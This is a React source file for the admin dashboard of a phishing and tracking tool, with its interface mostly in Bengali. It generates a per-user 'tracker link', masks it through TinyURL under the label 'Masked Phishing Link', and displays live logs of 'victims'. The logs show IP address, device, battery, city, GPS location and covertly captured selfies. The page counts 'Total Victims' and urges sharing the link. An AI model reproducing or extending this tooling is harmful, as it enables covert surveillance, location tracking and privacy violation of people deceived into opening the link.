
import React, { useState, useEffect } from 'react';
import { User, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
import { collection, query, where, onSnapshot, doc, getDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
import { auth, db } from '../firebase';
import { useNavigate } from 'react-router-dom';

interface LogEntry {
  id: string;
  timestamp: any;
  device?: {
    name: string;
    userAgent: string;
    screen: string;
  };
  battery?: { level: number; charging: boolean };
  location?: { lat: number; lng: number; accuracy?: number; };
  photoUrls?: string[];
  ip?: string;
  isp?: string;
  city?: string;
}

const Dashboard: React.FC<{ user: User }> = ({ user }) => {
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [loading, setLoading] = useState(true);
  const [profile, setProfile] = useState<any>(null);
  const [selectedPhotos, setSelectedPhotos] = useState<string[] | null>(null);
  const [copySuccess, setCopySuccess] = useState(false);
  const [shortUrl, setShortUrl] = useState('');
  const [shortening, setShortening] = useState(false);
  const navigate = useNavigate();
  
  const baseUrl = window.location.origin + window.location.pathname;
  const trackerLink = `${baseUrl}#/trk/${user.uid}`;

  useEffect(() => {
    if (!db) return;

    const fetchProfile = async () => {
      const docRef = doc(db, "users", user.uid);
      const docSnap = await getDoc(docRef);
      if (docSnap.exists()) setProfile(docSnap.data());
    };
    fetchProfile();

    const q = query(collection(db, "logs"), where("userId", "==", user.uid));
    const unsubscribe = onSnapshot(q, (snapshot) => {
      const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() })) as LogEntry[];
      data.sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));
      setLogs(data);
      setLoading(false);
    });

    return () => unsubscribe();
  }, [user.uid]);

  const handleSignOut = () => { signOut(auth); navigate('/login'); };
  
  const copyToClipboard = (text: string) => {
    if (!text) return;
    navigator.clipboard.writeText(text);
    setCopySuccess(true);
    setTimeout(() => setCopySuccess(false), 2000);
  };

  const createTinyUrl = async () => {
    setShortening(true);
    try {
      const response = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(trackerLink)}`);
      if (response.ok) {
        const url = await response.text();
        setShortUrl(url);
      }
    } catch (e) { alert("TinyURL API Error"); }
    setShortening(false);
  };

  return (
    <div className="min-h-screen bg-slate-50 font-['Hind_Siliguri'] pb-20">
      <nav className="bg-white border-b border-gray-100 px-6 py-4 flex justify-between items-center sticky top-0 z-50 shadow-sm">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center shadow-lg shadow-blue-200">
            <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
          </div>
          <h1 className="text-xl font-bold text-gray-800">অ্যাডমিন ড্যাশবোর্ড</h1>
        </div>
        <button onClick={handleSignOut} className="bg-red-50 text-red-600 font-bold text-sm px-6 py-2.5 rounded-xl hover:bg-red-600 hover:text-white transition-all">লগ আউট</button>
      </nav>

      <main className="max-w-7xl mx-auto p-4 md:p-8 space-y-8">
        {/* Real-time Statistics Header */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
           <div className="md:col-span-3 bg-gradient-to-r from-blue-700 to-indigo-800 p-10 rounded-[40px] text-white shadow-xl flex flex-col justify-center">
              <h2 className="text-3xl font-black">হ্যালো {profile?.fullName || 'ইউজার'},</h2>
              <p className="mt-3 text-blue-100 opacity-80">আপনার ভিক্টিমের সকল তথ্য এখানে লাইভ আপডেট হবে।</p>
           </div>
           <div className="bg-white p-10 rounded-[40px] shadow-sm border border-gray-100 flex flex-col justify-center items-center text-center">
              <p className="text-gray-400 text-xs font-black uppercase mb-1">Total Victims</p>
              <h3 className="text-6xl font-black text-blue-600 animate-pulse">{logs.length}</h3>
           </div>
        </div>

        {/* Link Management - Masked Link is now TinyURL */}
        <div className="bg-white p-10 rounded-[40px] shadow-sm border border-gray-100 space-y-8">
          <div>
            <h3 className="text-xs font-black text-gray-400 uppercase tracking-widest mb-4">Your Tracker Link</h3>
            <div className="flex flex-col md:flex-row gap-3">
              <input readOnly value={trackerLink} className="flex-1 bg-gray-50 px-6 py-4 rounded-2xl border border-gray-200 font-mono text-sm text-blue-600" />
              <button onClick={() => copyToClipboard(trackerLink)} className="bg-slate-800 text-white px-8 py-4 rounded-2xl font-black">Copy Raw Link</button>
              <button onClick={createTinyUrl} disabled={shortening} className="bg-blue-600 text-white px-10 py-4 rounded-2xl font-black shadow-lg shadow-blue-100">
                {shortening ? "প্রসেসিং..." : "Generate TinyURL"}
              </button>
            </div>
          </div>

          {shortUrl && (
            <div className="pt-8 border-t border-gray-50">
              <h3 className="text-xs font-black text-green-600 uppercase tracking-widest mb-4">Masked Phishing Link (TinyURL)</h3>
              <div className="flex flex-col md:flex-row gap-3">
                <input readOnly value={shortUrl} className="flex-1 bg-green-50 px-6 py-4 rounded-2xl border border-green-100 font-mono text-sm text-green-700 font-bold" />
                <button onClick={() => copyToClipboard(shortUrl)} className="bg-green-600 text-white px-10 py-4 rounded-2xl font-black shadow-lg shadow-green-100">কপি করুন</button>
              </div>
            </div>
          )}
        </div>

        {/* Logs Listing */}
        <div className="space-y-6">
          <h3 className="text-2xl font-black text-slate-800 flex items-center gap-3">
            <span className="w-3 h-10 bg-blue-600 rounded-full"></span>
            লাইভ রিপোর্টস
          </h3>
          
          <div className="grid grid-cols-1 gap-6">
            {logs.length === 0 ? (
              <div className="bg-white py-24 rounded-[40px] text-center border border-dashed border-gray-200">
                 <p className="text-gray-400 font-bold">এখনো কোনো ভিক্টিম নেই। লিংক শেয়ার করুন!</p>
              </div>
            ) : (
              logs.map((log) => (
                <div key={log.id} className="bg-white rounded-[40px] shadow-sm border border-gray-100 overflow-hidden group hover:border-blue-400 transition-all">
                  <div className="p-8 md:p-10 flex flex-col md:flex-row gap-10">
                    <div className="md:w-1/3 space-y-5">
                      <div className="flex items-center gap-5">
                         <div className="w-14 h-14 bg-blue-50 rounded-2xl flex items-center justify-center text-blue-600">
                            <svg className="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"/></svg>
                         </div>
                         <div>
                            <p className="text-[10px] font-black text-gray-400 uppercase">Victim Device</p>
                            <h4 className="font-black text-lg text-slate-800">{log.device?.name || 'Unknown'}</h4>
                            <p className="text-sm text-blue-600 font-black">{log.ip}</p>
                         </div>
                      </div>

                      <div className="grid grid-cols-2 gap-3">
                         <div className="bg-green-50 p-4 rounded-2xl border border-green-100">
                            <p className="text-[10px] text-green-600 font-black uppercase">Battery</p>
                            <p className="text-xl font-black text-green-700">{log.battery ? `${log.battery.level}%` : 'N/A'}</p>
                         </div>
                         <div className="bg-blue-50 p-4 rounded-2xl border border-blue-100">
                            <p className="text-[10px] text-blue-600 font-black uppercase">City</p>
                            <p className="text-xs font-black text-blue-800 truncate">{log.city || 'Unknown'}</p>
                         </div>
                      </div>
                    </div>

                    <div className="md:w-2/3 flex flex-col justify-center gap-5">
                      <div className="flex flex-wrap gap-4">
                         <button onClick={() => setSelectedPhotos(log.photoUrls || [])} className="flex-1 bg-slate-900 text-white font-black py-4 rounded-2xl hover:bg-slate-800 transition-all flex items-center justify-center gap-3">
                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"/><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"/></svg>
                            Selfie ({log.photoUrls?.length || 0})
                         </button>
                         <a href={log.location ? `https://www.google.com/maps?q=${log.location.lat},${log.location.lng}` : '#'} target="_blank" rel="noreferrer" className={`flex-1 flex items-center justify-center gap-3 font-black py-4 rounded-2xl transition-all ${log.location ? 'bg-blue-600 text-white shadow-lg' : 'bg-gray-100 text-gray-400 pointer-events-none'}`}>
                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" /></svg>
                            {log.location ? 'Location' : 'No GPS'}
                         </a>
                      </div>
                      <div className="bg-gray-50 p-4 rounded-2xl text-[11px] font-mono text-gray-400 break-all truncate">
                        Captured: {log.timestamp?.toDate().toLocaleString('bn-BD')}
                      </div>
                    </div>
                  </div>
                </div>
              )
            ))}
          </div>
        </div>

        {/* Selfie Modal */}
        {selectedPhotos && (
          <div className="fixed inset-0 z-[100] bg-slate-900/90 backdrop-blur-md flex items-center justify-center p-4">
            <div className="bg-white w-full max-w-4xl rounded-[40px] overflow-hidden shadow-2xl">
               <div className="p-8 border-b border-gray-100 flex justify-between items-center">
                  <h3 className="text-xl font-black text-gray-800">Captured Selfies</h3>
                  <button onClick={() => setSelectedPhotos(null)} className="w-10 h-10 bg-gray-50 rounded-full flex items-center justify-center text-gray-400">✕</button>
               </div>
               <div className="p-8 grid grid-cols-2 md:grid-cols-4 gap-4 overflow-y-auto max-h-[60vh]">
                  {selectedPhotos.map((url, i) => (
                    <img key={i} src={url} className="rounded-2xl w-full aspect-[3/4] object-cover border-2 border-gray-100 shadow-sm" />
                  ))}
               </div>
               <div className="p-8 bg-gray-50 text-center">
                  <button onClick={() => setSelectedPhotos(null)} className="bg-blue-600 text-white px-10 py-3 rounded-xl font-bold">বন্ধ করুন</button>
               </div>
            </div>
          </div>
        )}

        {/* Footer Admin Section */}
        <footer className="text-center py-10 mt-12 border-t border-gray-100">
           <p className="text-[10px] font-black text-gray-300 uppercase tracking-[0.4em] mb-6">Secure Monitoring Console v5.0</p>
           
           <div className="bg-white inline-flex items-center gap-4 px-8 py-5 rounded-[30px] shadow-sm border border-gray-100 hover:border-blue-200 transition-all">
              <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center">
                 <svg className="w-6 h-6 text-blue-600" fill="currentColor" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
              </div>
              <div className="text-left">
                <p className="text-[10px] text-gray-400 font-black uppercase leading-none mb-1">Developed By</p>
                <a href="https://www.facebook.com/profile.php?id=61569035777496" target="_blank" rel="noopener noreferrer" className="text-lg font-black text-slate-800 hover:text-blue-600 transition-all">Arefin Foysal</a>
              </div>
           </div>
        </footer>
      </main>
    </div>
  );
};

export default Dashboard;
